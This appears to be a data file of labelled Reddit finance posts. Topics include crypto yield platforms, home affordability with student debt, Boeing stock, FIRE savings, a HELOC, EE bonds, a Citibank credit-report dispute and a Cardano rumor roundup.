\- Blockfi has an intuitively designed, fantastic app. Also, you can call them and someone will answer the phone. Not the case with most platforms, including Coinbase, which just says ""maybe we'll answer your email, someday, sometime."" If your account has less than $100k in it - you may have to wait 10 minutes. If your account has substantially more in it, someone picks up right away. Ledn barely has an app at all. (EDIT: a note on security - All these apps, including Ledn, have 2FA - 2 factor authentication with the Google Authenticator app. In some cases, this will be obvious as the app will ask you if you’d like to turn this on. In other cases you will have to go into settings and enable it. Coinbase additionally has auth by security key which they say is super extra secure but requires a hardware device.) 

\- It is really fun watching your interest accrue daily on Blockfi. Maybe too fun. Even if Celsius gives more, it's not AS fun watching it there, because they pay it every Monday instead of daily. On the other hand, Blockfi doesn't actually pay out the interest until the end/beginning of the month, whereas Celsius pays it once a week. You just don't get the dopamine hit of watching the numbers go up during the week. 

\- when you're earning yield on Blockfi, Celsius, Nexo, or Ledn, your crypto isn't super-liquid, and this is not good if you want to make a trade on Coinbase Pro or elsewhere, when there's a sudden dip. From what I gather, you can whitelist wallets ahead of time (takes 24 hours to whitelist) on Celsius, but note that there's a $50,000 soft cap for instant transfers. Larger transfers take 24 - 48 hours to verify, which is a great security measure, but frustrating when you're trying to buy the dip... 

\- it can be annoying to move large amounts of crypto off of Coinbase Pro after buying, where it earns zero yield, due to the $50,000/day withdrawal cap. I'm still unclear if that cap applies on Coinbase as well as Coinbase Pro. Sometimes Coinbase says I have less crypto than I actually do when I try to make a transfer.

\- Still wondering if it's better to get a higher 10 - 12% APY yield on stablecoin in stablecoin or a lower APY yield on stablecoin in BTC.... ? I mean, obviously BTC if you really think about it, but I haven't done the math.

So yeah - no matter how much fun it is earning 8 - 12% yield on stablecoin, BTC in a major bull year obviously makes way, way more than a paltry 10% APY. Many people will feel that it's taking an unnecessary risk for an additional mere 4 - 6% (on BTC), not having your own keys and coins. But for me personally, I don't feel like buying a hardware wallet and learning how to use it, and I've assessed the risks I'm taking by using these platforms and feel okay with it - and I couldn't find a ton of info summarized like this when I was researching these platforms, hence the spreadsheet.

An additional note on historical stability of these companies - please see this timeline plotted over the BTC price chart from 2011 to present:

personalfinance,[US] How much house can we afford? Should we even buy a house? Late 20s couple with approx 1:1 student loan debt to income ratio,"Hi everyone, thanks for stopping by. My partner and I are getting married later this year and we will be combining finances. At the time, we make a combined gross $190k salary in a HCOL state and my fiance has approximately $200k (approx 4% interest rate) in student loan debt, I paid my $30k off about a year ago.

While on paper we are high earners, I personally feel as though this student loan debt is drowning us, at least me. We are not in the market right now to buy a home because, putting high home prices aside, I don't know if we should pay off the student loan debt first before buying a house or have it be a cloud over our heads while also having a mortgage. A note: we track our expenses and budget to the dollar and are very detailed with where our money is going.

Some more details in numbers:

- At the time, we are paying approximately $3000 in rent/utilities per month

- Other necessities including transportation, food we are budgetting approximately $800 per month

- Student loan payments for her are around $1300, down from $1800 due to refinancing. When we get married we are planning to refinance and get a lower interest rate.

- I am maxxing out my Roth IRA and my fiance will be starting to do that next month. 

- I also treat savings as an expense for which I budget around $1500 per month for.

Those are probably all of our biggest expenses. As for savings: we each have approximately $40k saved in each of our retirements. 

Now, interest rates are historically low and we have excellent credit scores and could probably get approved for homes for $700k+.

1. Given our debts (and interest rate) and income, should we be looking to buy a home? 

2. If yes, how much home can we afford? How much home *should* we pay given the situation?

3. If no, why not? Is it better to keep renting and pay off loans for a decade?

Thanks!",finance
stocks,Thoughts on $BA near term and long term,"I’m long on BA with 400 shares. I unfortunately bought at a peak around $273 and averaged down to $270. I’ve sold some CC along the way to help, but I stopped this week since the price movement has been quite volatile. 

Bullish sentiments:
Thinking about financials 62b in debt, but continue to have orders come in. Deferred orders from southwest to 2022 and 2023 was also announced today. 

New chinook orders for Britain, and 100 new planes ordered by SW airlines. Iran looking to revive orders though not sure if the geopolitical issues. 

Stock plummeted at the announcement of the CFO retiring at 54 years old and some FUD about it being a precursor to earnings since he did it just before earnings. I’m not familiar with the intricacies of management changes and how they affect stocks so maybe someone with more trading experience and fill me in? My theory is he intended to step in as CEO, but given his age and Calhoun getting an extension on CEO time frame he won’t really have a timeline to act as CEO, or he simply wanted to retire. Boeing isn’t in the verge of bankruptcy. 

Stock has been bludgeoned since owning it, but I’ve not let my emotions get the best of me as I feel conviction that it can hit $300 in a year or two just sucks to have to wait. 

Balance sheet wise they also have another loan they haven’t drawn down on and may not need to tap into. Likely negative cash flow this quarter, but near term CEO Calhoun expects a return to positive cash flow. A large back order of planes at around 4,300 and military side of the business.  After hours news today that the transportation committee is doing a third audit into the approval of the max return (yeesh seems a bit like overkill, but ok)

Boeing has ramped up hiring according to a few sources I know. They’ve also liquidated unnecessary real estate holdings to save cash, pushed voluntary retirements to bring in fresh cheaper labor, and have maintained their dividend halt to help with cash flow. 

Boeing has had so much heat I think it’s leadership understands the gravity of the QA problems that need to be addressed. I actually like that they’ve stayed pretty quiet and mostly focused on working through the problems. Sometimes silence is better than opening ones mouth especially with the sentiment and brand damage they’ve been dealing with. As they say actions speak louder than words. 

Bearish sentiments:
Vaccinations nationwide around 20% fully vaccinated and 40% on their first shot. Europe, Middle East and Asian markets are dealing with their own issues of vaccine distribution. 

There’s some talk about another financial crash happening this year due to defaults from zombie companies raising on debt and historically large margin borrowing. 

Interest rates rising could affect profits.  

SpaceX and LMT are competitors and who knows what other market spacex could try to tap (ahem consumer aviation?)

Is it possible they could do a share offering to pay down debts further diluting the stock? No one knows, but could happen. Seems ramping production and deliveries could help avoid this. 

Boeing definitely has a culture issue, but it could be foolish to think management doesn’t recognize some of these issues as they’ve had their feet held closest to the fire, still the issue remains. 

Don’t overlook the political issues with China. Lots of materials sourced from the region to manage costs. Really gotta bank on relationships improving over the next few years. 

What are your thoughts? For the record I’m down about $15000 unrealized YTD. Talk about “diamond hands” as they say.  I owned Boeing for 12 years prior before selling earlier in the year. Rebought at a bad timing.

Update: things evolve fast. Sounds like JJ vaccine approved again in Europe. 

My price target is $285 end of year. I think that’s realistic in a forward thinking market and assuming no more plane crashes or catastrophic events that hamper Boeing’s ability to profit.",finance
financialindependence,Just hit 400k NW at 29 years old,"Hi folks!

Just sharing that I recently hit the milestone of $400k NW. Almost all of that net worth is in stocks in brokerage/401k/Roth.

My journey on the road to FIRE:

* Was broke for a couple years between high school and college and struggling to make rent.
* Went to college for Computer Science BS. During college I discovered Mr. Money Mustache's blog which was a game changer and have since gotten into the other names (JL Collins, Mad FIentist, etc.).
* Over the last 5 years, have worked a couple software engineer jobs and also finished an online Master's (although that probably hasn't affected my earnings tbh). Paid off \~$30k student loan debt, \~$8k auto loan debt within like a year and a half of graduating.
* After initial ""set-up costs"" for adulting (furniture etc.), have hit 60-75% savings rate over most of the last 5 years. This involved making sacrifices about how far to live from work in a HCOL area. Compensation increasing over time from $90k to \~$240k doesn't hurt either.

My advantage is that most of the things I enjoy doing don't involve money, so it doesn't feel like a slog to be honest. Now that I have a decent amount saved I've been spending more on services that buy me time (meal delivery service, moving company, etc.), but due to investment returns my savings rate is still probably quite high and in that range.

It all feels very surreal to me watching my NW shoot up from the negatives to this number in like 5 years. I imagine it only speeds up from here; such a weird feeling and I have much to be grateful for. Definitely owe a debt to the people who have helped me along the way. It also feels good to be able to help friends out when they're struggling, although sometimes it can be difficult to draw a line there, in certain cases.

**Bit of Advice:** Don't talk to people about your net worth or money. Stealth wealth is the way to go. Relationships will be changed if you broadcast that. Just talk about it with your fellow Reddit people. :)

**Considerations for the future:** Do I even want to retire early? What do I want to do with my life if I'm free from the work I'm doing now? Always dreamed of spending more time on creative endeavors; perhaps I need to nudge myself to overcome some hesitancy there. I am also undecided on if I ever want to own a house. Housing market where I am is exhibiting some bubble-like characteristics. Also I'm single, don't need much space, like living downtown, etc.

**Investing heterodoxy**: I have been deviating somewhat from the ""invest in VT/VTI"" advice that tends to be standard in these types of spaces. I am investing aggressively in [factors](https://en.wikipedia.org/wiki/Fama%E2%80%93French_three-factor_model#Fama%E2%80%93French_five-factor_model): much of my ownership is actually tilted toward the Avantis small-cap value ETF's AVUV and AVDV (as well as Alpha Architect's Value/Momentum ETF's). With the growth/value spread being essentially [as wide as it has ever been](https://www.aqr.com/Insights/Perspectives/Is-Systematic-Value-Investing-Dead), investing in value is looking really good right now. Recommend checking out [this paper](https://www.pwlcapital.com/resources/five-factor-investing-with-etfs/) for anyone interested in more info. I have also taken on margin loans through M1 Finance at a 2% interest rate for approximately 1/3 of my taxable account's value. This is more risk of course, which I believe I can duly manage through consistent contribution and rebalancing when necessary.

Books that have been influential on my thinking, portfolio-wise:

* On factors: *Your Complete Guide to Factor-Based Investing: The Way Smart Money Invests Today*
* On ""time diversification"" through use of leverage: *Lifecycle Investing: A New, Safe, and Audacious Way to Improve the Performance of Your Retirement Portfolio*

personalfinance,Should I get a HELOC?,"My wife and I are considering a HELOC from Suntrust (with a fixed rate of 3.5% for 10 years) and would appreciate your thoughts. It requires minimum draw of $15,000 upfront. No fees as long as my wife and I keep it for 3 years. The total possible draw would be around $50k but I'm assuming it'll grow over time. We would fully plan on paying the loan back at the end of the 10 years with a fixed rate (unless the variable terms were great I suppose).

We have a few house improvement projects we are wanting to do and we plan to buy a used car sometime this year (she needs a 4 door vehicle for our baby instead of her 2 door right now). So the $15k would be helpful in the near term but we could also pay for these over a longer time horizon with cash. 

Other info about our situation: 

Emergency funds to last a year in a bank account. 

We don't have debts other than mortgage (at 2.6% rate) and $10k in federal student loans at 3.75% (don't have to make payments, 0% currently, and honestly may be completely forgiven).

We don't want to touch our stocks/indices/etfs (in tax advantaged accounts or out of them) for this discussion. 

Basically, we don't need the HELOC and there aren't any obviously advantageous ways to use it for us (no credit card debt with 20% APR, etc). My wife understandably doesn't like the idea of us taking out debt just to have debt. However, more than the cheap $15k at 3.5%, I am attracted to the idea of having access to such a cheap fixed rate for 10 years in case anything pops up. Even if we don't use the $15k for any of these purchases/projects, I think it would be reasonable to just put that money in index funds/etfs and let it coast to pay for the interest (at least). And if after 3 years I can pay off the 15k and keep the HELOC open for 7 years, I'd be happy to do that. 

Do you have any thoughts, advice, or perspectives on this?",finance

personalfinance,EE Savings Bond to Help Delay Social Security.,"Maxed out all of my tax-advantaged space for 2020 and 2021 and still have some cash to deploy. Would EE Savings Bond be a good strategy? Principle doubles if held to maturity (20 years) so that is effectively a 3.5%  per year return for an illiquid bond asset. $10k invested today will yield $20k in income in 2041, and so on and so on if I max out each subsequent year. The idea of effectively funding an annuity at a 50% discount so that I can delay collecting on Social Security definitely has its appeal. 

Portfolio is low seven figures, most of it in taxable accounts unfortunately.

15% International Equities  
15% Long Term US Treasuries  
10% TIPs

5% REITs  
5% Gold

Is there a better use of my money? In terms of risk I feel like I have a ton of equity risk. Main existential concerns would be rising interest rates, lost decade with U.S. economy, US Dollar losing its status as global reserve currency. Main practical concern with EE Savings Bonds is Treasury Direct would be easy to miss for my beneficiaries and/or they might not bother to attempt to get a few thousand dollars out of a pokey fed account.",finance
personalfinance,Repeated attempts to get Citibank to rectify my credit report have been rebuffed,"To anyone who reads this, i ask you bear with me please, as I have attempted to little avail to shorten the description of a slightly complex history. What has happened to my FICO score from the situation I describe here is so crazy, and I’m at my wits end as to what to do to rectify the situation. We recently applied to refinance our home with the current incredibly low interest rates and had to pay an extra 0.5% of interest because of my low score. This has prompted me to see what I can do to have an incident from 2017 erased off my credit report.

I had a Citibank card for 28 years. Always paid this account on time along with all my other financial obligations. And, until 2017 I had a perfect credit history – never a late payment on any loan or credit account. I’ve had other financial setbacks, having lived the first half of my life in a depressed city in what now is the rust belt, but I’ve always managed to keep my head above the rising water, despite the odds.

With the Citibank account, I had set up a minimum automatic payment of $150/month in 2013. I set up a higher minimum for all my accounts in order to pay off the balance more quickly, and this is especially helpful when a low balance means a low monthly automatic payment and taking forever to pay off relatively low balances. Citibank had done the automatic withdraws of $150 anytime we had a balance over the next four years – all is good. I had for years before 2013 had the account as autopay for the minimum due, and I never thought about payments again – as long as I had money in my account, auto pay would pay the account on time.

In February of 2017, we took advantage (as we had done repeatedly in the past with various CC) of a zero interest for 18 months offer to pay for a $15k roof solar panel system. With the rebates from the State and Federal governments, the $15k system would cost only $4.5k, but you had to wait to get those as tax credits in the next filing year with the Feds and space the state credits over a four year period. We ended up paying off the bulk of the Citibank account near to the end of the 0% interest term.
In February of 2017, Citibank resumed automatic payments from my banking account as they had done in the years before when we had a balance, however, they only withdrew $150 of the $239 minimum required payment. I had created a new email account some years earlier simply because the old one received too much junk mail but kept that old account/address and, after going paperless in 2016, that is the account Citibank sent correspondence to. I so rarely used the Citibank card that I did not receive statements from them often, and in the year before 2017 I received no account emails. When I did want to pay off any balances, I always signed in directly to the online account. I was not even aware that I had left my old email as their primary contact.

After the insufficient payment withdraw by Citibank in February of 2017, they assessed a $37 late fee. The same underpayment automatic withdraws of only $150 happened for the following three months, but their email to me was titled simply, “Your AutoPay reminder”.

In May they sent a warning email titled “Account Alert – Explore Your Options”, with instructions with options for “customers who are experiencing financial difficulty”. Unfortunately, I did not see/read this email either. From May until November, the same thing happened almost every month. However, they assessed a late fee only up until August and the remainder of the year, did not add the penalty. Also, oddly, they did not consistently send either the “Autopay” or the “Alert” emails every month.

Each month the $150 would come out of the account, so I thought all was well with the account. We were making a payment regularly, so, without looking at the notices they sent me, I hadn’t a clue that anything was amiss.

In the first week of December, by happenstance, I was looking for a password update from another account on the old email account and noticed their warning email and immediately contacted them, then paid the entire outstanding amount of $810. Their reminder notice dated 11/23/2017 stated this:

“Your Scheduled Payment

Hi XXX, Just a reminder, your AutoPay payment amount of $150.00 will be paid from your payment account ending in XXXX on 11/28/2017. No action is needed but, if you would like to pay a different amount each month, you can make edits or skip this payment – just make any changes before 5pm ET on your payment date. Note that if you skip an AutoPay payment, you will need to make a one-time payment by the due date to meet your Minimum Due and avoid going late.”

The next reminder notice was issued on 12/5/2017, just after I contacted them. See if you can spot any wording differences.

“Your Scheduled Payment

Hi XXX, Just a reminder, your Min Due AutoPay payment amount of $1,031.00 will be paid from your payment account ending in XXXX on 12/28/2017. No action is needed but, if you would like to pay a different amount each month, you can make edits or skip this payment – just make any changes before 5pm ET on your payment date. Note that if you skip an AutoPay payment, you will need to make a one-time payment by the due date to meet your Minimum Due and avoid going late.”

Not sure what significance ""Min Due AutoPay"" has over their previous wording, but this is the only reminder notice that has ever had this statement on it. All subsequent notices had some version of the old wording.

So, it appears that our attempt to set a minimum due amount to always pay at least $150 resulted in them setting the account to not take more than $150, no matter what amount was due. I did not ask them to remove the $150 limit after I contacted them, but apparently they did so on their own initiative, I also mistakenly thought they told me that it was on my banks end that the limit was imposed – my notes say from my call say “the limit was initiated on my end” – essentially, that it was the fault of me and my bank. In the three years following this incident, any attempts to discuss the situation with Citibank were rebuffed with their claim that delinquent accounts over three months past due cannot be disputed.

There are five things that are especially puzzling about this situation:

1. That they did not charge the late fee every month.
2. That the penalty interest rate of 29.990% was never imposed.
3. They honored the 0% interest rate for the full 18-month term (they did charge 18% on the new monthly late fees).
4. That every billing statement both before and after stated in bold letters “Your Account is enrolled in AutoPay” There was no qualification to this – “Autopay” before the late incident, “Autopay” afterwards.
5. As I stated above, only the statement sent the day after I called Citibank, dated 12/5/2017 contained the words “Min Due AutoPay”. All subsequent upcoming payment reminders continued with on the simpler “AutoPay” description.

The reason #5 is significant is that I hadn’t a clue that Citibank would not take more than $150. This limitation is never outright stated anywhere - not in emails or statements. Now, I’m sure to the credit card savvy and certainly to Citibank staff it would be obvious, but no other credit card account where we had enrolled in their pay at least a set amount options worked this way. I seriously am perplexed as to why there would be an advantage for the consumer to have an account that could be set so that there is a limit to how much money a creditor can withdraw. If the minimum payment due had been even $150.01, I would not have made the minimum. Why would Citibank offer something that the other CC companies do not? If the consumer was unaware of Citibank’s rules, it’s the perfect trap.

Their web page for editing automatic payments titled, “Edit Your Next AutoPay Payment” has a choice below for “Custom Amount” and you can enter an amount, but it has no other qualifications – no explanations that would tell you that entering an amount will set a limit on how much Citibank can withdraw going forward. Now, please understand, this is how Citibank has their payment editing page configured now – I have no idea how we had set the $150 minimum payment in 2013.  

So, the point of this email is to see if anyone can offer advice about whether there is any way to get Citibank to reconsider the  punishment they have imposed of ruining my credit record. Is it worth suing Citibank or going through a company like FairShake to see if they can do something? 

I really don’t understand what advantage there is for Citibank to be so rigid. They got their money as soon as I recognized the situation, plus they automatically withdrew the equivalent outstanding balance of $810 that I just paid after calling them – they got double the outstanding amount. 

What especially irks me is that they knew my address and had my telephone number, yet they made no attempt to notify me other than by email. We had only enrolled in paperless billing the year before, so there is no doubt they knew where I lived. 

Also puzzling is that I have not found a single email notice or statement that says the account is closed. When I first called them in 2017, the person I talked with did not mention that my account was closed. It was only sometime in 2018 that I realized the account status (yes, call me naive, but I’ve never had a credit dispute before). And, even today, three years later, I can still log into my account (which the website homepage does now say the account is closed) and download the current month’s statement, and it still shows the $17k credit limit and that I’m enrolled with Autopay. And still no mention of the account being closed. However, my card expired in 2020 and they did not send me a replacement card!

I find it also odd that Citibank continues to send me credit applications for their Diamond Preferred card, though, I doubt if they would offer the $17k credit limit I had on my old card – but I suppose it’s automatic marketing as my FICO score has crept from it’s low of 560 to what is now 680. In 2008, I got a $105k home equity line of credit from them for home improvement and took almost the entire amount from it before closing the account after refinancing my home at a substantially better interest rate in 2013. You would think it would be in their interest to recognize a series of errors that lead to this situation and that it has nothing to do with my credit worthiness and certainly we have not been “experiencing financial difficulty”. And, does anyone know why Citibank would not impose any monetary punishments for the delinquencies? In the 10 months of underpayment, they did charge a $37 late fee for first six of those months. So, what’s in it for Citibank? Clearly there is an advantage for the entire lending-credit industry for consumers to have a lower FICO score so they can charge higher interest rates, but nothing is to be gained by Citibank itself.  

Recently, I was explaining my situation to a friend, and they suggested I file a complaint with the Consumer Financial Protection Bureau. I included most of the information stated above in that complaint. This action did, finally, get a response from Citibank, and I have included that response below:

You recently reached out to the Consumer Financial Protection Bureau regarding your concern about Citi, and we’ve reviewed your request. 

Your enrollment in AutoPay was changed from the minimum payment due to a $150.00 set amount on November 11, 2013 via Citi Online.  You utilized a promotional balance transfer check for $15,500.00, at the Annual Percentage Rate (APR) of 0%, which expired on March 1, 2018.  A $465.00 balance transfer fee was associated with this offer.  These adjustments appeared on your February 2017 statement, which reflected a $15,965.00 balance and a $239.00 minimum payment due by February 28, 2017.  The 0% promotional rate appeared on your February 2017 through March 2018 statements. 

Your February through December 2017 statements notified you that a $150.00 AutoPay payment would be deducted from your bank account, as well as the status of your account.  Because payments in addition to the $150.00 AutoPay payments were not received, your March 2017 through December 2017 statements reflected a delinquent status, which was reported to the consumer reporting agencies.  In addition, late fees were assessed in accordance with your Card Agreement.  The account was closed by Citi on November 3, 2017 and your AutoPay enrollment was updated to the minimum payment due on December 9, 2017.   
Your account was enrolled in Paperless Statements on July 9, 2016.  Monthly statement notification emails were sent to the email address you provided, which advised that your statements were available to be viewed online.  This notification also advised you were enrolled in AutoPay and provided the balance and the minimum payment due.  In addition, email notifications were sent to you beginning in May 2017, which advised of the delinquency and offered payment solutions.  These notifications were not returned to us as undeliverable. 
  
Your credit profile at the consumer reporting agencies includes a record of how you maintain your personal credit account with us.  We confirmed that the account information and payment history in your credit report are correct and are unable to change it.  Since you do not agree with the reported information and we want to continue to help you, we’re going to ask the reporting agencies to add a note to your credit profile stating that the information is “disputed by the consumer.”  Please allow 30 days for them to update your records.   

If you’d like the “disputed by the consumer” note removed from your credit profile, please contact us at the address listed above.",finance

cardano,Cardano Rumor Rundown APR 21 2021: The Africa Special Anticipation Deep Dive!,"[https://youtu.be/TZevH6OZa\_4](https://youtu.be/TZevH6OZa_4)

Let's go....

Newly covered today:

1. Africa special going down April 29th, 16:30 UTC!!!!!!! That’s 9:30am Pacific; 10:30am Mountain; 12:30pm Eastern, 5:30pm Dublin; 7:30pm Addis Ababa; 11:30pm Bangkok.   [https://africa.cardano.org/ ](https://africa.cardano.org/)[https://twitter.com/InputOutputHK/status/1384587491190222849](https://twitter.com/InputOutputHK/status/1384587491190222849) [https://twitter.com/IOHK\_Charles/status/1384582745116987393](https://twitter.com/IOHK_Charles/status/1384582745116987393)
2. Shahaf Bar-Geffen, CEO of COTI (the first recipient of a Cardano CFund investment), says he just finished recording his segment in the Africa special which he mentioned was airing at the end of April prior to the IOHK announcement of April 29th. He also said: 1) ADA Pay may be ready in early May or maybe even late April; 2) there will be a big launch for ADA Pay and once the Africa Special airs “everything will connect”; 3) “people are probably not getting how big this is….but you will down the line”; 4) COTI integration with a major exchange is happening, progress is not as quick as they would like, but it’s progressing; 5) last week they released the possible designs for debit cards, they are even considering some designs submitted by the community; and 6) iOS and Android integration is coming along nicely and well on the way.

4. It looks like Yellow Card and Payway are listed on the Africa Special website.  Given their business models, it is easy to guess that they could be valuable in the Pan Africa Strategy.  [https://payway.et/](https://payway.et/) [https://yellowcard.io/](https://yellowcard.io/)

Previously Covered but still interesting:

1. Charles posts a pic of a taxidermy African bird called a Turacos. He follows up that post by saying ""Guys sometimes a stuffed Ethiopian exotic bird next to an old identity book is just a stuffed Ethiopian exotic bird next to an old identity book. Stop reading into things"". Everyone enjoys speculating what exactly this could mean with the obvious implication being that the African bird announcement involves digital identity in Ethiopia. [https://twitter.com/IOHK\_Charles/status/1369397063583227911](https://twitter.com/IOHK_Charles/status/1369397063583227911) [https://twitter.com/IOHK\_Charles/status/1369402020067766275](https://twitter.com/IOHK_Charles/status/1369402020067766275)
2. It's announced that 591 different assets have been minted on Cardano in the last eight days. [https://twitter.com/IOHK\_Charles/status/1369347294324162561](https://twitter.com/IOHK_Charles/status/1369347294324162561)
3. Charles says they are actually going to hire investigators for the IOG anti-scammer team. People with a law enforcement or intelligence background should feel free to apply. Should have a report on the team’s first investigation soon. Hopefully, this will contribute to scammers actually actively avoiding (those alliterations tho!) Cardano. Could also be a nice basis for an intelligence apparatus and private military when we build the Cardano Citadel. I mean somebody is gonna have to man the watchtowers if we’re gonna keep out all the no-coiners and ETH people. Kidding...kidding. [https://youtu.be/6God9Xtzuqs](https://youtu.be/6God9Xtzuqs)
4. Cardano hodler Ben Askren continues preparations for his boxing match with Jake Paul. Being a Cardano hodler, it is already a foregone conclusion that Askren’s aura will cause Jake Paul to refuse to fight before the opening bell even sounds. [https://twitter.com/Benaskren/status/1286094545973846017](https://twitter.com/Benaskren/status/1286094545973846017) [https://twitter.com/Benaskren/status/1376021472993480705](https://twitter.com/Benaskren/status/1376021472993480705)
5. We hit 100% decentralization of block production tomorrow. Breath it in, friends. Taste the sweet completely decentralized air. Many crypto ecosystems will never know that feeling. [https://twitter.com/InputOutputHK/status/1376527930159816706](https://twitter.com/InputOutputHK/status/1376527930159816706)
6. Today is D-Day, d=0, complete decentralization of block production as covered in preceding days. Enjoy it guys!!!
7. The Daedalus wallet now supports native tokens! [https://twitter.com/InputOutputHK/status/1376936748715020288](https://twitter.com/InputOutputHK/status/1376936748715020288)
8. Charles recently mentioned Senegal in the Julian Hosp interview. I believe that is the first time this nation state has been discussed in the context of the pan-African strategy for Cardano. [https://youtu.be/Zm6I1agqPWQ](https://youtu.be/Zm6I1agqPWQ)
9. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem. To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
10. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”. When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase. The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
11. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed trying to buy Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe.

13. Graph blockchain has announced an acquisition of $300k in ADA for staking purposes. Once the corporate finance world finds understands the dynamic around staking in Cardano, we may see announcements like this with dollar values that are orders of magnitude higher. Right now the corporate world is considering holding BTC on their balance sheets. But, yield on ADA holdings might become hyperattractive to a wide spectrum of companies once they understand the dynamics of staking and that a compounding yield is available for capture.

18. Charles tweets a pic of a Turaco and John Hancock. It seems safe to assume this means the minister has signed or is signing the Ethiopia deal! This could finally retire rumor #1 that started the Rumor Rundown. [https://twitter.com/ArmySpies/status/1378416705282613253](https://twitter.com/ArmySpies/status/1378416705282613253)

24. Sebastien was recently on Kaizen Crypto and detailed how Emurgo plans to deliver Proof of Keys for Cardano whereby users could sign a message to prove that they own the private keys to a certain account in a standardized format. All queued up to the exact spot: [https://youtu.be/VcRlL-6YROY?t=625](https://youtu.be/VcRlL-6YROY?t=625)

26. Liqwid founder, Dewayne Cameron, did a great interview with Cardano with Paul. It sounds like Liqwid is currently having a team of Haskell developers build out their product in Plutus for a target launch around the same time as Alonzo. This is great news since earlier in its history it looked like Liqwid would initially build in Solidity and use the KEVM bridge. Making their product native to Plutus out of the gate seems like a great move! Dewane also had some really good info about working with IOHK and how a team of seasoned Haskell devs could walk in and probably build anything in Plutus over a not too long timeline. Also a really good discussion of how EUTXO will give their users an advantage in predictability of transaction cost over users of account-balance (e.g. ETH) based competitors. [https://www.youtube.com/watch?v=dUDze81LCWs](https://www.youtube.com/watch?v=dUDze81LCWs)
27. Occam Association President, Mark Berger, also did an interview with Rick McCracken on Cardano Live. He provided some good detail on what Occam would like to deliver and where they currently are in their development. [https://youtu.be/vTBLIZ7voz8](https://youtu.be/vTBLIZ7voz8)
28. Tomorrow we’ll hit the items from the roadmap video that Charles just did.
29. Cardano is now being used as a traceability solution in conjunction with Scantrust for wine from the Nation State of Georgia. This is a great use case for the Cardano blockchain! [https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/ https://www.scantrust.com/](https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/)
30. The latest roadmap video from Charles covered a lot of ground. We’ll tackle it piece by piece. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
31. Ourobouros Omega. Ourobouros Classic 2016 was a “theoretical artifact” that IOHK could build upon. Ourobouros Praos was 2017 and it’s still running now. Ourobouros Genesis was 2018. Ourobouros Omega is going to be the capstone. It will be a rollup of all the previous iterations plus Redux, Chronos, Ledger Combiners, and some things they’ve learned from the larger industry. The paper and a prototype will be this year. We want to be there by Cardano 2025.
32. Light Clients/Wallets (e.g. Yoroi). Great way to get a view on the blockchain through a server. Trouble is that it’s not trustless as to the blockchain since you don’t download it. Protocols currently on the market like Mina are using recursive snarks (“zk-snark” = “Zero-Knowledge Succinct Non-Interactive Argument of Knowledge”). You can basically have a proof that proves 1) coins exist, and 2) haven’t been double spent with a goal of 22kb of data (very small amount of data). IOHK has been following Mina and “Bulletproofs” (also a type of snark). IOHK will bring out a paper and (hopefully) prototype of the Mithral Protocol this year. It will be a similar trustless model where light wallet is the default and you can still trust the blockchain on the server is correct without downloading the chain.
33. Today will be Part II of the coverage of the lates Roadmap vid from Charles. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
34. Sidechains. They call the main chain the “Cardano Settlement Layer” (CSL) and the side chains are called “Cardano Computation Layers” (CCL). They are looking at having CCLs for the EVM, IELE, Catalyst, and WASM (web assembly). They are trying to figure out how to pay for the maintenance of these side chains. A current thought is to possibly create a mechanism where you can “refine” ADA to get “fuel” for these sidechains. You could even have a Plutus side chain that runs on its own fuel. This year they will propose a Cardano Improvement Proposal (CIP) to see if the community wants to update the monetary policy in an HFC event to go in this direction. This could be a good way to include the parachain ideas from Polkadot. They could also add Hyperledger related permissioned sidechains with this.
35. Layer Two. A lot of deal flow with Prism right now around digital identify for things like authenticated wallets, KYC/AML, regulated DeFi, and human readable addresses. Charles will probably do a full video on this. Hydra is the other piece of off-chain infrastructure for this year. IOHK has a whole team working on this. They’ve already put out two papers on this. Will put out two more papers this year and a prototype will also be on the way. Hydra will be run by the stake pool operators.
36. “With all this, we’re going to piss all over what ETH 2.0 is trying to accomplish”. I’m paraphrasing slightly, but I almost spit out my coffee when he said this.
37. Quantum Resistance. This will be a big project involving: QR VRF, QR zero knowledge stuff, quantum signatures, and modeling of a quantum adversary. This is a huge amount of work. But this is a whole agenda that is in scope for Cardano 2025.
38. Catalyst &amp; Voltaire. Right now Catalyst is mainly about treasury but it needs to be linked to Voltaire which is all about protocol updates. This will probably mean a bicameral voting model that controls hard fork combinator events.There will be DAO as a service to provide voting rights for your users if you build a dApp or other project on Cardano. They will move from the current plutocracy to something that is hybridized between the current system and “proof of merit”. This is going to require a lot of thinking around the social science behind governance. It will be a more nuanced power dynamic.
39. Approach to the Reference Client.Right now it’s just Haskell, they will probably also build out clients in Python and Rust. Eventually they may have things like Agda, Idris, or Coq at the core. This notion of a “Core Developer” could end up being a digital identity that is authorized through voting.
40. Commercial. On the commercial side they are really going to scale things up to the eight figure level. There’s a lot of good news coming there. Charles says he is reserving that for the Africa Special.
41. Coinbase now has a Cardano Explainer. [https://www.coinbase.com/learn/crypto-basics/what-is-cardano](https://www.coinbase.com/learn/crypto-basics/what-is-cardano)

46. The Cardano native token space continues to flourish. [https://twitter.com/matiwinnetou/status/1380600524853108738](https://twitter.com/matiwinnetou/status/1380600524853108738)
